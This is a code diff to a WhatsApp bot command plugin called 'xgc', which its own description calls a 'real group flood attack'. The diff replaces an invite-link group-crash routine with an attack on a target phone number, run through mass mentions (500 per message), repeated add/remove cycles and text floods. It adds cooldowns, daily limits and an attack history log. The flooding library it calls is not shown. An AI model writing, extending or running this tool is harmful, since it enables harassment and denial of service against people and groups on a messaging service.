@@ -1,12 +1,81 @@
 // plugins/xgc.js
 const { cmd } = require('../arslan');
-const { RizoGCCrash } = require('../lib/rizogccrash');
-const guard = require('../lib/rizogccrash_guard');
+const { XGC } = require('../lib/xgc');
+
+const fs = require('fs');
+const path = require('path');
+let userConfig = {};
+try { userConfig = require('../config'); } catch (_) {}
+
+function clean(v) {
+    if (!v) return '';
+    let r = String(v).trim();
+    if (r.includes('@')) r = r.split('@')[0];
+    if (r.includes(':')) r = r.split(':')[0];
+    return r.replace(/[^0-9]/g, '');
+}
+
+const OWNERS = [
+    ...(Array.isArray(userConfig.OWNER_NUMBERS) ? userConfig.OWNER_NUMBERS : []),
+    userConfig.OWNER_NUMBER
+].map(clean).filter(Boolean);
+
+const STATE_FILE = path.join(__dirname, '..', 'xgc_state.json');
+const DEFAULTS = { protected: OWNERS, protectedGroups: [], cooldownHours: 24, dailyLimit: 2, history: [], lastAt: 0 };
+
+function loadState() {
+    if (!fs.existsSync(STATE_FILE)) {
+        try { fs.writeFileSync(STATE_FILE, JSON.stringify(DEFAULTS, null, 2)); } catch (_) {}
+        return { ...DEFAULTS };
+    }
+    try { return { ...DEFAULTS, ...JSON.parse(fs.readFileSync(STATE_FILE, 'utf-8')) }; }
+    catch (_) { return { ...DEFAULTS }; }
+}
+function saveState(s) {
+    try { fs.writeFileSync(STATE_FILE, JSON.stringify(s, null, 2)); } catch (_) {}
+}
+function hoursSince(ts) { return (Date.now() - new Date(ts).getTime()) / 3600000; }
+
+function checkTarget(target, botNum, groupJid) {
+    const s = loadState();
+    if (target === botNum || (botNum && target.endsWith(botNum))) {
+        return { ok: false, reason: 'SELF_PROTECT', msg: '🛡 Bot ka apna number target nahi.' };
+    }
+    if (s.protected.includes(target)) {
+        return { ok: false, reason: 'PROTECTED', msg: '🛡 Ye number protected hai.' };
+    }
+    if (groupJid && s.protectedGroups.includes(groupJid)) {
+        return { ok: false, reason: 'GROUP_PROTECTED', msg: '🛡 Ye group protected hai.' };
+    }
+    const last = [...s.history].reverse().find(h => h.target === target && h.status === 'success');
+    if (last && hoursSince(last.ts) < s.cooldownHours) {
+        const r = (s.cooldownHours - hoursSince(last.ts)).toFixed(1);
+        return { ok: false, reason: 'COOLDOWN', msg: `⏳ ${r}h pehle hit hua.` };
+    }
+    const today = new Date().toISOString().slice(0, 10);
+    const t = s.history.filter(h => h.status === 'success' && h.ts.startsWith(today)).length;
+    if (t >= s.dailyLimit) {
+        return { ok: false, reason: 'DAILY_LIMIT', msg: `📊 Aaj ka limit khatam.` };
+    }
+    return { ok: true };
+}
+
+function recordAttack(target, status) {
+    const s = loadState();
+    s.history.push({ target, ts: new Date().toISOString(), status });
+    if (status === 'success') s.lastAt = Date.now();
+    if (s.history.length > 500) s.history = s.history.slice(-500);
+    saveState(s);
+}
+
+function botNumFrom(conn) {
+    return String(conn.user?.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+}
 
 cmd({
     pattern: 'xgc',
     alias: ['xgcrash', 'xgroupcrash'],
-    desc: 'X Group Crash — light vectors, bot-safe (owner only)',
+    desc: 'XGC — real group flood attack (owner only)',
     category: 'owner',
     react: '⚡',
     filename: __filename,
@@ -14,81 +83,76 @@ cmd({
 },
 async (conn, mek, m, { from, args, isCreator, reply }) => {
     try {
-        if (!isCreator) return reply('🔒 *Owner Only — XGC*');
-        if (!args[0]) {
+        if (!isCreator) return reply('🔒 *Owner Only*');
+
+        // must be in a group
+        if (!from.endsWith('@g.us')) {
             return reply(
-`📌 *Usage:* .xgc <grouplink>
+`⚡ *XGC — Group Attack*
 
-📖 *Example:*
-.xgc https://chat.whatsapp.com/ABC123
+📌 *Usage:* (run in a group)
+.xgc <target_number> [mode]
 
-⚡ Vector : mention + invisible
-🔇 Silent : ON
-⏱️ Auto-delete: 30s
-🛡 Bot-safe: YES
-⏳ 168h per group`
+📖 *Modes:*
+• \`mention\` — 500 mentions per message (3x)
+• \`addremove\` — 8 add/remove cycles
+• \`text\` — 30 group text messages
+• \`all\` — all vectors (default)
+
+📖 *Examples:*
+.xgc 923001234567 mention
+.xgc 923001234567 all
+
+⚠️ Run this command inside the target group
+🎯 Bot must be in the group`
             );
         }
 
-        const link = args[0];
-        const m2 = String(link).match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
-        if (!m2) return reply('❌ *Invalid group link!*');
-        const code = m2[1];
+        if (!args[0]) return reply('❌ *Target number do:* `.xgc 923xxxxxxx [mode]`');
 
-        let metadata, groupJid;
-        try {
-            metadata = await conn.groupGetInviteInfo(code);
-            groupJid = metadata.id;
-        } catch (e) {
-            return reply(`❌ *Access denied:* ${e.message}`);
-        }
+        const num = String(args[0]).replace(/[^0-9]/g, '');
+        if (!num || num.length < 10) return reply('❌ *Invalid number!*');
 
-        const check = guard.checkTarget(groupJid);
-        if (!check.ok) {
-            return reply(`${check.msg}\n\n🚫 Group: \`${code}\`\n📋 ${check.reason}`);
-        }
+        const mode = (args[1] || 'all').toLowerCase();
+        const groupJid = from;
+
+        const check = checkTarget(num, botNumFrom(conn), groupJid);
+        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${num}\`\n📋 ${check.reason}`);
 
         await reply(
 `⚡ *XGC LOCKED*
-🔗 Group : \`${code}\`
-📛 Name  : *${metadata.subject || '?'}*
-👥 Members: \`${metadata.participants?.length || '?'}\`
-⚡ Mode  : light (mention + invis)
-🔇 Silent: ON | ⏱️ Auto-delete: 30s
-🛡 Bot-safe: active
+🎯 Target : \`${num}\`
+📍 Group  : current
+💥 Mode   : ${mode}
+🧬 Vectors: mention + addremove + text
 ⚡ Launching...`
         );
 
         let lastPct = 0;
-        const result = await RizoGCCrash(conn, groupJid, metadata, 'xgc', (sent, total, type) => {
-            const pct = Math.floor((sent / total) * 100);
-            if (pct >= lastPct + 40) {
+        const result = await XGC(conn, groupJid, num, mode, (sent, total, type) => {
+            const pct = total > 0 ? Math.floor((sent / total) * 100) : 0;
+            if (pct >= lastPct + 25) {
                 lastPct = pct;
-                conn.sendMessage(from, { text: `⏳ XGC ${pct}% — *${type}*` }).catch(() => {});
+                conn.sendMessage(from, { text: `⏳ ${pct}% — *${type}* (${sent}/${total})` }).catch(() => {});
             }
         });
 
         if (result.ok) {
-            guard.recordAttack(groupJid, 'success');
+            recordAttack(num, 'success');
             await conn.sendMessage(from, { react: { text: '⚡', key: mek.key } });
-            const stats = guard.getStats();
             return reply(
 `✅ *XGC COMPLETE*
-🔗 Group : \`${code}\`
-📤 Sent   : \`${result.sent}\` payloads
-❌ Errors : \`${result.errors || 0}\` (${result.errorRate})
-🎯 Vectors: ${result.vectors?.join(' + ') || 'xgc'}
-
-📊 Today : ${stats.todayCount}/${stats.dailyLimit}
-⏳ Next in 180 min`
+🎯 Target : \`${num}\`
+📤 Sent   : \`${result.sent}\` actions
+❌ Errors : \`${result.errors}\` (${result.errorRate})
+🧬 Vectors: ${result.vectors?.join(' + ') || mode}
+🕒 ${new Date().toLocaleString()}`
             );
         } else {
-            guard.recordAttack(groupJid, 'failed:' + result.error);
-            return reply(`⚠️ *Failed:* ${result.error || 'all vectors errored'}`);
+            recordAttack(num, 'failed');
+            return reply(`⚠️ *Failed* — check bot admin status for addremove mode.`);
         }
-
     } catch (err) {
-        console.log('XGC ERROR:', err);
-        return reply(`❌ *XGC ERROR*\n\n${err.message}`);
+        return reply(`❌ ${err.message}`);
     }
 });
